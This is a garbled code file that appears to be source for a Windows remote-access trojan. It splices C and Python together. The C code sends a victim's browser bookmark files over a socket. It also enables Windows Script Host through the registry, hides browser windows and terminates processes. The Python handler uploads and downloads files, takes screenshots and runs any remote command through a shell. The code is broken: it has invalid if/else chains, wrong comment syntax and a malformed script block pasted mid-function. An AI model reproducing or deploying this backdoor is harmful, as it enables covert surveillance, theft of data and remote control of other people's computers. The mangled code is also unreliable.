  STRUCTURE_COMMAND *lCommandStructure = (STRUCTURE_COMMAND *) pParameter; 

  ZeroMemory(lTemp, sizeof(lTemp));
  snprintf(lTemp, sizeof(lTemp) - 1, "<browserfavorites>");
  lFuncRetVal = send(lCommandStructure->lRemoteSocket, lTemp, strlen(lTemp), 0);

  if ((lHomeDirectory = getenv("HOMEPATH")) != NULL)
  {
    findFavoritesFiles(lCommandStructure->lRemoteSocket, lHomeDirectory);
  } else {
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\(HOMEPATH)\AppData\Roaming\Opera Software\Opera Stable\\");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\(HOMEPATH)\AppData\Roaming\Mozilla\Firefox\Profiles\{profile}.default\\places.sqlite");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\(HOMEPATH)\AppData\local\Microsoft\Edge\User Data\Default\\Bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\(HOMEPATH)\AppData\local\Google\Chrome\User Data\Default\\Bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\(HOMEPATH)\Favorites\\");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Program Files\Opera\\bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Program Files (x86)\Opera\\bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Program Files\Mozilla Firefox\browser\\omni.ja");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Program Files (x86)\Microsoft\Edge\Application\{version}\Resources\\Bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Program Files (x86)\Google\Chrome\Application\{version}\Resources\\Bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Windows\Favorites\\");
}

  ZeroMemory(lTemp, sizeof(lTemp));
  snprintf(lTemp, sizeof(lTemp) - 1, "</browserfavorites>");
  lFuncRetVal = send(lCommandStructure->lRemoteSocket, lTemp, strlen(lTemp), 0);

  return(lRetVal);
}


int listFavoritesEntries(SOCKET pRemoteSocket, char *pFileName)
{
  HANDLE lFileHandle = INVALID_HANDLE_VALUE;
  int lRetVal = 0;
  int lFuncRetVal = 0;
  char lTemp[MAX_BUF_SIZE + 1];
  char lDataBuffer[MAX_BUF_SIZE + 1];
  char *lURLPointer = NULL;
  int lLastPosition = 0;
  char *lFileDataBuffer = NULL;
  DWORD lBytesRead = 0;

  if ((lFileHandle = CreateFile(pFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
  {
    if ((lFileDataBuffer = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, GetFileSize(lFileHandle, 0))) != NULL)
    {
      ZeroMemory(lDataBuffer, sizeof(lDataBuffer));

      if (ReadFile(lFileHandle, lFileDataBuffer, GetFileSize(lFileHandle, 0),  &lBytesRead, NULL))
      {
        lLastPosition = 0;
        while(readLine(lDataBuffer, sizeof(lDataBuffer) - 1, lFileDataBuffer, GetFileSize(lFileHandle, 0), &lLastPosition))
        {


        # delete trailing NL/CR

          while (lDataBuffer[strlen(lDataBuffer) - 1] == '\n' || lDataBuffer[strlen(lDataBuffer) - 1] == '\r')
            lDataBuffer[strlen(lDataBuffer) - 1] = '\0';


        # find URL-entry in favorite file


          if (strncmp(lDataBuffer, "url=", 4) == 0 || strncmp(lDataBuffer, "URL=", 4) == 0)
          {
            lURLPointer = lDataBuffer + 4;

            ZeroMemory(lTemp, sizeof(lTemp));
            _snprintf(lTemp, sizeof(lTemp) - 1, "<favoriteentry><filename>%s</filename><url>%s</url></favoriteentry>", pFileName, lURLPointer);
            lFuncRetVal = send(pRemoteSocket, lTemp, strlen(lTemp), 0);
          }

          ZeroMemory(lDataBuffer, sizeof(lDataBuffer));
        } # while(readLine(lDataBuffer, si...
      } # if ((lFileDataBuffer = (char *) Heapalloc(...
    } # if (ReadFile(lFil...
  } # if ((lFileHandle = CreateFile(...

END:

  if (lFileDataBuffer != NULL)
    HeapFree(GetProcessHeap(), 0, lFileDataBuffer);

  if (lFileHandle != INVALID_HANDLE_VALUE)
    CloseHandle(lFileHandle);

  return(lRetVal);    
}


# List directory content and add filesize to the global resource counter

void listFiles(char *pDirectory)
{
  char mDirectoryPattern[MAX_BUF_SIZE + 1];
  char mFullPath[MAX_BUF_SIZE];
  int mCounter = 0;
  WIN32_FIND_DATA mFindFileData;
  HANDLE mFindHandle = INVALID_HANDLE_VALUE;
  struct _stat mStatusBuffer;


  # Iterate through the base directory and search for files.

  ZeroMemory(mDirectoryPattern, sizeof(mDirectoryPattern));
  snprintf(mDirectoryPattern, sizeof(mDirectoryPattern) - 1, "%s*", pDirectory);


  if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)
  {
    ZeroMemory(mFullPath, sizeof(mFullPath));
    snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);


    # File is a directory. Call this function recursively to 
    # check it for further matching files.


    if (PathIsDirectory(mFullPath))
    {
      if (mFindFileData.cFileName[0] != '.')
      {
        if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
        {
          if (mFullPath[strlen(mFullPath) - 1] != '\\')
            strncat (mFullPath, "\\", 1);

          listFiles(mFullPath);
        }
      } 


    # It's a file and it's the first one so add it to the list.
    
    } else {
      _stat(mFullPath, &mStatusBuffer);
      gCurrentHDResourceUsed += mFindFileData.nFileSizeLow;
    }


    # Further files were found. Add them to the list.

    while (FindNextFile(mFindHandle, &mFindFileData) != 0) 
    {
      ZeroMemory(mFullPath, sizeof(mFullPath));
      snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);


      # File is a directory. Call this function recursively to 
      # check it for further matching files.

      if (PathIsDirectory(mFullPath))  
      {
        if (mFindFileData.cFileName[0] != '.')
        {
          if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
          {
            if (mFullPath[strlen(mFullPath) - 1] != '\\')
              strncat (mFullPath, "\\", 1);

            listFiles(mFullPath);
          }
        }


       # It's a file so add it to the list.

      } else {
        _stat(mFullPath, &mStatusBuffer);
        gCurrentHDResourceUsed += mFindFileData.nFileSizeLow;
      } # if (PathIsDirectory(mFullPath))
    } # while (FindNextFile(mFindHandle, &mFindFileData) != 0)
    FindClose(mFindHandle);
  } # if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)
}


# Manage HD resources

void HDDManager()
{
  int mExitStatus = 0;
  int mCounter = 0;
  int mOldestFileSize = 0;
  char mDirectory[MAX_BUF_SIZE + 1];
  char mDirectoryPattern[MAX_BUF_SIZE + 1];
  char mDeleteFile[MAX_BUF_SIZE + 1];
  char mOldestFile[MAX_BUF_SIZE + 1];
  HANDLE mFileHandle = INVALID_HANDLE_VALUE;
  FILE *mFH = NULL;


  # Find all data files and accumulate file size
  
  for (mCounter = 0, gCurrentHDResourceUsed = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
  {  
    ZeroMemory(mDirectory, sizeof(mDirectory));
    if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mDirectory, MAX_BUF_SIZE) == 0)
      continue;


    # If entry is a drive and no directory add a ":"

    if (mDirectory[strlen(mDirectory) - 1] == ':')
      strcat(mDirectory, "\\");
    else if (mDirectory[strlen(mDirectory) - 1] != '\\')
      strncat (mDirectory, "\\", 1);


    ZeroMemory(mDirectoryPattern, sizeof(mDirectoryPattern));
    snprintf(mDirectoryPattern, sizeof(mDirectoryPattern) - 1, "%s%s\\%s\\", mDirectory, gBaseDirectory, BD_DATA_DIR);


    if (! PathFileExists(mDirectoryPattern))
      continue;

    listFiles(mDirectoryPattern);
  } # for (mCounter = 0, gTotalUsedMemory = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)


  # If upper volume limit is reached delete the oldest files. [!!!]


  ZeroMemory(mDeleteFile, sizeof(mDeleteFile));
  snprintf(mDeleteFile, sizeof(mDeleteFile) - 1, "%s%s", mDirectoryPattern, FULL_FILE);

  if (gCurrentHDResourceUsed > atoi(gMaxHDResource))
  {


    # Create the FULL_FILE so applications wont write any data to the upload directory

    if ((mFileHandle = CreateFile(mDeleteFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
      CloseHandle(mFileHandle);


    # Map all files with size and creation date and delete the oldest file(s) [!!!]

    for (mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
    {  
      ZeroMemory(mDirectory, sizeof(mDirectory));
      if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mDirectory, MAX_BUF_SIZE) == 0)
        continue;


      # If entry is a drive and no directory add a ":"

      if (mDirectory[strlen(mDirectory) - 1] == ':')
        strcat(mDirectory, "\\");
      else if (mDirectory[strlen(mDirectory) - 1] != '\\')
        strncat (mDirectory, "\\", 1);


      ZeroMemory(mDirectoryPattern, sizeof(mDirectoryPattern));
      snprintf(mDirectoryPattern, sizeof(mDirectoryPattern) - 1, "%s%s\\%s\\", mDirectory, gBaseDirectory, BD_DATA_DIR);


      if (! PathFileExists(mDirectoryPattern))
        continue;

      createDetailedFileListing(mDirectoryPattern);
    } # for (mCounter = 0; gBDEnvironmentDirs[mCounter]


   # Delete the oldest files. [!!!]

    mCounter = 0;
    while (((gCurrentHDResourceUsed + (atoi(gMaxHDResource) / 20)) > atoi(gMaxHDResource)) && mCounter < 512)
    {
      ZeroMemory(mOldestFile, sizeof(mOldestFile));

      if((mOldestFileSize = findOldestFile(mOldestFile, sizeof(mOldestFile) - 1)) && (strlen(mOldestFile) > 0) )
        if (DeleteFile(mOldestFile) != 0)
          gCurrentHDResourceUsed -= mOldestFileSize;

      mCounter++;
    }

    deleteAllItems();
  } else { # if ((gCurrentHDResourceUsed) > atoi(gMaxHDResource))
    DeleteFile(mDeleteFile);
  } # if ((gCurrentHDResourceUsed) > atoi(gMaxHDResource))
}


# List directory content and add files to list

int createDetailedFileListing(char *pDirectory)
{
  int mRetVal = 0;
  char mDirectoryPattern[MAX_BUF_SIZE + 1];
  char mFullPath[MAX_BUF_SIZE];
  int mCounter = 0;
  WIN32_FIND_DATA mFindFileData;
  HANDLE mFindHandle = INVALID_HANDLE_VALUE;
  struct _stat mStatusBuffer;
  int mTotalStorageUsed = 0;


  ZeroMemory(mDirectoryPattern, sizeof(MAX_BUF_SIZE + 1));
  snprintf(mDirectoryPattern,  MAX_BUF_SIZE, "%s*", pDirectory);

  
  if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)
  {
    ZeroMemory(mFullPath, sizeof(mFullPath));
    snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);


    # File is a directory. Call this function recursively and check 
    # this directory for further matching files.

    if (PathIsDirectory(mFullPath))
    {
      if (mFindFileData.cFileName[0] != '.')
      {
        if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
        {
          if (mFullPath[strlen(mFullPath) - 1] != '\\')
            strncat (mFullPath, "\\", 1);

          createDetailedFileListing(mFullPath);
        } # if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
      } # if (mFindFileData.cFileName[0] != '.')


    # Its a file and its' the first one, add it.

    } else {
      _stat(mFullPath, &mStatusBuffer);
      addItem(mFullPath, mFindFileData.nFileSizeLow, mStatusBuffer.st_ctime);
      mTotalStorageUsed += mFindFileData.nFileSizeLow;
    } # if (PathIsDirectory(mFullPath))


    # Further matching files found.

    while (FindNextFile(mFindHandle, &mFindFileData) != 0)
    {
      ZeroMemory(mFullPath, sizeof(mFullPath));
      snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);


      # File is a directory. Call this function recursively and check 
      # this directory for further matching files.

      if (PathIsDirectory(mFullPath))  
      {
        if (mFindFileData.cFileName[0] != '.')
        {
          if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
          {
            if (mFullPath[strlen(mFullPath) - 1] != '\\')
              strncat (mFullPath, "\\", 1);

            createDetailedFileListing(mFullPath);
          }
        }


      # It's a file so add it!

      } else {
        _stat(mFullPath, &mStatusBuffer);
        mTotalStorageUsed += mFindFileData.nFileSizeLow;
        addItem(mFullPath, mFindFileData.nFileSizeLow, mStatusBuffer.st_ctime);
      } # if (PathIsDirectory(mFullPath))
    } # while (FindNextFile(mFindHandle, &mFindFileData) != 0)

    FindClose(mFindHandle);
    mFindHandle = INVALID_HANDLE_VALUE;
    mRetVal = mTotalStorageUsed;

  } # if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)

  if (mFindHandle != INVALID_HANDLE_VALUE)
    FindClose(mFindHandle);

  return(mRetVal);
}


# Add an item to the list

int addItem(char *pFileName, int pFileSize, int pCreationTime)
{
  int mRetVal = 0;
  PFILE_ITEM mCurrentItem = NULL;

  
  # No file item attached to the list yet

  
  if (gFileListHead == NULL)
  {
    if ((gFileListHead = (PFILE_ITEM) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILE_ITEM))) != NULL)
    {
      strncpy(gFileListHead->mFileName, pFileName, MAX_BUF_SIZE);
      gFileListHead->mFileSize = pFileSize;
      gFileListHead->mCreationTime = pCreationTime;
    } else {
      mRetVal = -1;
      goto END;
    } # if ((gFileListHead = (PFILE_ITEM) HeapAlloc(GetProcessHeap()
  } else {
    mCurrentItem = gFileListHead;

    while (mCurrentItem->mNextItem != NULL)
      mCurrentItem = mCurrentItem->mNextItem;

    if ((mCurrentItem->mNextItem = (PFILE_ITEM) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILE_ITEM))) != NULL)
    {
      mCurrentItem = mCurrentItem->mNextItem;
      strncpy(mCurrentItem->mFileName, pFileName, MAX_BUF_SIZE);
      mCurrentItem->mFileSize = pFileSize;
      mCurrentItem->mCreationTime = pCreationTime;
    } else {
      mRetVal = -2;
      goto END;
    }
  }

END:

  return(mRetVal);
}


# Check if windows scripting host is activated

int isScriptingActive()
{
  int mRetVal = 1;
  int mRegValue = 0;
  HKEY mKey = NULL;
  char *mEnableValue = NULL;
  long mValueType = 0;
  unsigned long mPathLength = 0;


  if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Script Host\\Settings\\", 0, KEY_READ, &mKey) == ERROR_SUCCESS)
  {
    mValueType = REG_SZ;
    if (RegQueryValueEx(mKey, "Enable", 0, (unsigned long *) &mValueType, NULL, &mPathLength) == ERROR_SUCCESS)
    {
      if (mPathLength > 0)
      {     
        if ((mEnableValue = (char *) HeapAlloc(GetProcessHeap(), 0 , mPathLength)) != NULL)
        {
          ZeroMemory(mEnableValue, mPathLength);
          RegQueryValueEx(mKey, "Enable", 0, (unsigned long *) &mValueType, (unsigned char *) mEnableValue, &mPathLength);

          mRegValue = atoi(mEnableValue);
        
          if (mRegValue <= 0)
            mRetVal = 1; # scripting is inactive
          else
            mRetVal = 0; # scripting is active

          HeapFree(GetProcessHeap(), 0, mEnableValue);
          mEnableValue = NULL;
        } # if ((mEnableValue = (char *) HeapAlloc(GetProcessHeap(), 0 , mPathLength)) == NULL)
      } # if (mPathLength > 0)
    } # if (RegQueryValueEx(mKey, "Enable", 0, (unsigned long *) &mValueType, NULL, &mPathLength) == ERROR_SUCCESS)
    RegCloseKey(mKey);
  } # if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Script Host\\Settings\\", 0, KEY_READ, &mKey)


  return(mRetVal);
}


# Activate the windows scripting host environment.
    
void activateWindowsScriptingHost()
{    
  HKEY mKey = NULL;
  STARTUPINFO si;
  PROCESS_INFORMATION pi;


  # Deactivate system error beep in the registry

  if(RegOpenKeyEx(HKEY_CURRENT_USER,"Control Panel\\Sound\\", 0, KEY_WRITE, &mKey) == ERROR_SUCCESS)
  {
    RegSetValueEx(mKey, "Beep", 0, REG_SZ, (unsigned char *) "no", 2);
    RegCloseKey(mKey);
  }


# adding a silly regedit for some funs: 

import subprocess

# XML code containing the VBScript
  xml_code = """

  <package>
   <job id="vbs">
      <script language="VBScript">
         set WshShell = WScript.CreateObject("WScript.Shell")
         strDesktop = WshShell.SpecialFolders("Desktop")
         set oShellLink = WshShell.CreateShortcut(strDesktop & "\Shortcut Script.lnk")
         oShellLink.TargetPath = WScript.ScriptFullName
         oShellLink.WindowStyle = 1
         oShellLink.Hotkey = "CTRL+SHIFT+F"
         oShellLink.IconLocation = "notepad.exe, 0"
         oShellLink.Description = "Shortcut Script"
         oShellLink.WorkingDirectory = strDesktop
         oShellLink.Save
      </script>
   </job>
  
  /xml_code"""

# XML code containing the  JScript jobs

   <job id="js">
      <script language="JScript">
         var WshShell = WScript.CreateObject("WScript.Shell");
         strDesktop = WshShell.SpecialFolders("Desktop");
         var oShellLink = WshShell.CreateShortcut(strDesktop + "\\Shortcut Script.lnk");
         oShellLink.TargetPath = WScript.ScriptFullName;
         oShellLink.WindowStyle = 1;
         oShellLink.Hotkey = "CTRL+SHIFT+F";
         oShellLink.IconLocation = "notepad.exe, 0";
         oShellLink.Description = "Shortcut Script";
         oShellLink.WorkingDirectory = strDesktop;
         oShellLink.Save();
      </script>
   </job>
</package>
"""

def create_shortcut():
    # Save the XML code to a file
    xml_file = "shortcut_code.xml"
    with open(xml_file, "w") as f:
        f.write(xml_code)
    
    # Execute the XML code using the Windows Script Host
    subprocess.run(["cscript", "//NoLogo", "//E:vbscript", "shortcut_code.xml"], shell=True)

# Create the shortcut
create_shortcut()

# End of regedit funs...


  # Set registry values.
  
  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Script Host\\Settings\\", 0, KEY_WRITE, &mKey) == ERROR_SUCCESS)
  {
    RegSetValueEx(mKey, "Enable", 0, REG_SZ, (unsigned char *) "1", 1);
    RegCloseKey(mKey);
  }


  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Scripting Host\\Settings\\", 0, KEY_WRITE, &mKey) == ERROR_SUCCESS)
  {
    RegSetValueEx(mKey, "Enable", 0, REG_SZ, (unsigned char *) "1", 1);
    RegCloseKey(mKey);
  }




  {
    # If there's already a running instance of it, check if its one of 
  # ours (marked with _SILENZIO) and hide it, if necessary.    
    
  } else {
    EnumWindows((WNDENUMPROC) EnumWindowsProcHider, 0);      
  } # if (processExists2(mTemp) != 0)   
}


# Window enumeration callback function. locate the iexplore.exe window and mark it.

BOOL CALLBACK EnumWindowsProcMarker(HWND hWnd,LPARAM lParam)
{
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];  
  char winText[MAX_BUF_SIZE];
  DWORD mPID = 0;
  HANDLE hCurrProcHandle;
  HMODULE hMod;
  DWORD cbNeeded;
  int i = 0;


  ZeroMemory(winText, sizeof(winText) - 1);
  if(GetWindowTextLength(hWnd))
  {
    GetWindowText(hWnd, winText, sizeof(winText) - 1);
    GetWindowThreadProcessId(hWnd, &mPID);

    if (mPID == (unsigned long) gPID)
    {
      if ((hCurrProcHandle = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, mPID)) != NULL)
      {
        if (EnumProcessModules(hCurrProcHandle, &hMod, sizeof(hMod), &cbNeeded))
        {
          ZeroMemory(mTemp2, sizeof(mTemp2));
          GetWindowText(hWnd, mTemp2, sizeof(mTemp2) - 1);

          if (strstr(mTemp2, gBaseDirectory) == NULL)
          {
            ZeroMemory(mTemp, sizeof(mTemp));
            snprintf(mTemp, sizeof(mTemp) - 1, "%s %s", gBaseDirectory, mTemp2);
            SetWindowText(hWnd, mTemp);
            ZeroMemory(mTemp2, sizeof(mTemp2));
            GetWindowText(hWnd, mTemp2, sizeof(mTemp2) - 1); 	     
          }

          ZeroMemory(mTemp, sizeof(mTemp));               
          GetModuleBaseName(hCurrProcHandle, hMod, winText, sizeof(winText));
          lowerToUpperCase(winText);
          strncpy(mTemp, winText, sizeof(mTemp) - 1);
        }
        CloseHandle(hCurrProcHandle);
      }
    }
  }

  return(1);
} 


# Window enumeration callback function. locate the iexplore.exe window and hide it.

BOOL CALLBACK EnumWindowsProcHider(HWND hWnd,LPARAM lParam)
{
  char mTemp[MAX_BUF_SIZE + 1]; 
  char winText[MAX_BUF_SIZE];
  DWORD mPID = 0;
  HANDLE hCurrProcHandle;
  HMODULE hMod;
  DWORD cbNeeded;

  ZeroMemory(winText, sizeof(winText) - 1);
  if(GetWindowTextLength(hWnd))
  {
    GetWindowText(hWnd, winText, sizeof(winText) - 1);
    GetWindowThreadProcessId(hWnd, &mPID);

    if (mPID == (unsigned long) gPID)
    {
      if ((hCurrProcHandle = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, mPID)) != NULL)
      {
        if (EnumProcessModules(hCurrProcHandle, &hMod, sizeof(hMod), &cbNeeded)) 
        {
          ZeroMemory(mTemp, sizeof(mTemp));
          GetWindowText(hWnd, mTemp, sizeof(mTemp) - 1);

          if (strstr(mTemp, gBaseDirectory) != NULL && IsWindowVisible(hWnd))
          {
            ShowWindow(hWnd, SW_HIDE);
            UpdateWindow(hWnd);
            Sleep(50);
            SetWindowLong(hWnd, GWL_EXSTYLE, GetWindowLong(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
            Sleep(50);
            ShowWindow(hWnd, SW_HIDE);
            UpdateWindow(hWnd);
            gHidden = 0;
          }
        }
        CloseHandle(hCurrProcHandle);
      }
    }    
  }
  return(1);
}


# Find a process by its name.

int processExists(char *pProcessName, int *pPID)
{
  HANDLE hProcessSnap;
  HANDLE hProcess;
  PROCESSENTRY32 pe32;
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];
  char mBinaryName[MAX_BUF_SIZE + 1];
  HMODULE hMods[1024];
  DWORD cbNeeded;
  int mCounter = 0;
  int mRetVal = 1;

  if (pProcessName == NULL)
    return(-1);

  if((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
    return(-2);

  pe32.dwSize = sizeof(PROCESSENTRY32);


  # Retrieve information about the first process,
  # and exit if unsuccessful.

  if(!Process32First(hProcessSnap, &pe32) )
  {
    CloseHandle( hProcessSnap );
    return(-3);
  }


  # Now walk the snapshot of processes, and
  # display information about each process in turn.

  do
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mTemp2, sizeof(mTemp2));

    if (pProcessName != NULL)
      lowerToUpperCase(pe32.szExeFile);

    if (pProcessName != NULL)
      snprintf(mTemp, sizeof(mTemp) -1, "%s", pe32.szExeFile);
    else
      snprintf(mTemp, sizeof(mTemp) -1, "%s", pe32.szExeFile);


    # Determine full path process binary name.

    if((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) != NULL)
    {
      if(EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) != 0)
      {
        if (GetModuleFileNameEx( hProcess, hMods[0], mBinaryName, sizeof(mBinaryName)))
        {
          if (pProcessName != NULL)
            lowerToUpperCase(mBinaryName);

          snprintf(mTemp2, sizeof(mTemp2) -1, "%s", mBinaryName);
        }
      }
      CloseHandle(hProcess);
    }

    if (pProcessName != NULL && (strstr(mTemp, pProcessName) != NULL || strstr(mTemp2, pProcessName) != NULL))
    { 
      if (pPID != NULL)
        *pPID = pe32.th32ProcessID;

      mRetVal = 0;
      break;
    }
  } while(Process32Next(hProcessSnap, &pe32));


  CloseHandle(hProcessSnap);

  if (mRetVal != 0)
    gHidden = 1;

  return(mRetVal);
}



# Find a process by PID.

int PIDExists(int pPid)
{
  HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
  HANDLE hProcess = INVALID_HANDLE_VALUE;
  PROCESSENTRY32 pe32;
  int mCounter = 0;
  int mRetVal = 1;

  if (pPid < 0)
  {
    mRetVal = -1;
    goto END;
  }

  if((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
  {
    mRetVal = -2;
    goto END;
  }


  pe32.dwSize = sizeof(PROCESSENTRY32);


  # Retrieve information about the first process and exit if unsuccessful

  if(!Process32First(hProcessSnap, &pe32))
  {
    mRetVal = -3;
    goto END;
  }


  # Now walk the snapshot of processes, and display information about each process in turn

  do
  {
    mRetVal = 24;
    if ((unsigned int) pPid == pe32.th32ProcessID)
    {
      mRetVal = 0;
      break;
    }
  } while(Process32Next(hProcessSnap, &pe32));

END:

  if (hProcessSnap != INVALID_HANDLE_VALUE)
    CloseHandle(hProcessSnap);

  if (hProcess != INVALID_HANDLE_VALUE)
    CloseHandle(hProcess);  

  return(mRetVal);
}


# Kill all processes started in our home directory but dont touch our own process [!!!]

int killOurProcesses(char *pBaseDirectory)
{
  HANDLE hProcessSnap;
  HANDLE hProcess;
  PROCESSENTRY32 pe32;
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];
  char mBinaryName[MAX_BUF_SIZE + 1];
  HMODULE hMods[1024];
  DWORD cbNeeded;
  int mCounter = 0;
  int mRetVal = 0;


  if (pBaseDirectory == NULL || pBaseDirectory[0] == '\0')
  {
    mRetVal = 1;
    goto END;
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);
  if ((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
  {
    mRetVal = 2;
    goto END;
  }


  if(!Process32First(hProcessSnap, &pe32) )
  {
    if (!Process32Next(hProcessSnap, &pe32))
    {
      CloseHandle(hProcessSnap);     # Must clean up the snapshot object! [:D]
      mRetVal = 3;
      goto END;
    }  
  }


  do
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mTemp2, sizeof(mTemp2));

    if(pe32.th32ProcessID != GetCurrentProcessId() && (hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) != NULL)
      if(EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) != 0)
        if (GetModuleFileNameEx(hProcess, hMods[0], mBinaryName, sizeof(mBinaryName)))
          if (StrStrI(mBinaryName, pBaseDirectory))
            TerminateProcess(hProcess, 0);

  } while(Process32Next(hProcessSnap, &pe32));


END:

  if (hProcessSnap != INVALID_HANDLE_VALUE)
    CloseHandle(hProcessSnap);
    
  return(mRetVal);
}


# Find a service by name.

int serviceExists(char *pServicePattern)
{
  SC_HANDLE mSCM; 
  ENUM_SERVICE_STATUS_PROCESS *mNextService;   
  DWORD mBufferSize = 0;
  DWORD mCounter = 0;
  DWORD mResume = 0;
  DWORD i = 0;  
  char *mBuffer, *mServiceName;
  char mTemp[MAX_BUF_SIZE + 1];
  char mServicePattern[MAX_BUF_SIZE + 1];
  int mRetVal = 1;

  mSCM = OpenSCManager(NULL, NULL, GENERIC_READ);
  mBuffer = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mBufferSize);

  ZeroMemory(mBuffer, mBufferSize);
  EnumServicesStatusEx(mSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_ACTIVE, (unsigned char *) mBuffer, mBufferSize, &mBufferSize, &mCounter, &mResume, NULL);


  ZeroMemory(mServicePattern, sizeof(mServicePattern));
  strncpy(mServicePattern, pServicePattern, sizeof(mServicePattern) - 1);
  lowerToUpperCase(mServicePattern);

  for(i = 0; i < mCounter; i++)
  {
    mNextService = ((ENUM_SERVICE_STATUS_PROCESS *) mBuffer) + i;
    mServiceName = _strlwr(strdup(mNextService->lpServiceName));
  
    ZeroMemory(mTemp, sizeof(mTemp));
    strncpy(mTemp, mServiceName, sizeof(mTemp) - 1);
    lowerToUpperCase(mTemp);  
 

    # Check if service exists.
    
    if (strstr(mTemp, mServicePattern) != NULL)
    {
      mRetVal = 0;
      goto END;
    }  
  }
  
END:

  CloseServiceHandle(mSCM);  

  if (mBuffer != NULL)
  {
    HeapFree(GetProcessHeap(), 0, mBuffer);
    mBuffer = NULL;
  }
  
  return(mRetVal);
}






# Function to upload files
def upload_file(file, conn):
    try:
        with open(file, "rb") as f:
            conn.send(f.read())
    except Exception as e:
        conn.send(str(e).encode())

# Function to download files
def download_file(file, conn):
    try:
        with open(file, "wb") as f:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                f.write(data)
    except Exception as e:
        conn.send(str(e).encode())

# Function to take screenshots
def grab_screenshot(conn):
    try:
        if os.name == "posix":  # macOS
            subprocess.run(["screencapture", "screenshot.png"])
        else:  # Other OS
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot.save("screenshot.png")
        
        upload_file("screenshot.png", conn)
        os.remove("screenshot.png")
    except Exception as e:
        conn.send(str(e).encode())

# Function to handle incoming connections
def handle_connection(conn, addr):
    print(f"[+] New connection from {addr}")
    while True:
        try:
            command = conn.recv(1024).decode()
            if command == "quit":
                break
            elif command.startswith("upload"):
                _, filename = command.split()
                upload_file(filename, conn)
            elif command.startswith("download"):
                _, filename = command.split()
                download_file(filename, conn)
            elif command == "screenshot":
                grab_screenshot(conn)
            else:
                output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                conn.send(output.stdout.read())
